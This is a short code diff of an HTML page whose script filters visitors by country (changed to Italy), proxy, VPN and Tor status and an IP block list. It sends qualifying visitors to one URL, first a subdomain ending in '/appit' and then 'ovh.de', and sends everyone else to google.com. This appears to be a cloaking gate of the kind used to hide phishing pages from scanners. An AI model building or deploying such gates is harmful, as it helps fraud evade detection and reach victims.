@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>system</title>
   <script>
-    const allowedCountry = 'EU';
+    const allowedCountry = 'IT';
     const token = "2cf2c3841c01a9";
 
     const blockedIPs = [
@@ -82,7 +82,7 @@
         const isTor = privacyData.tor;
 
         if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
-          window.location.href = "https://actionacc.alwaysdata.net/appit";
+          window.location.href = "https://ovh.de";
         } else {
           window.location.href = "https://google.com";
         }
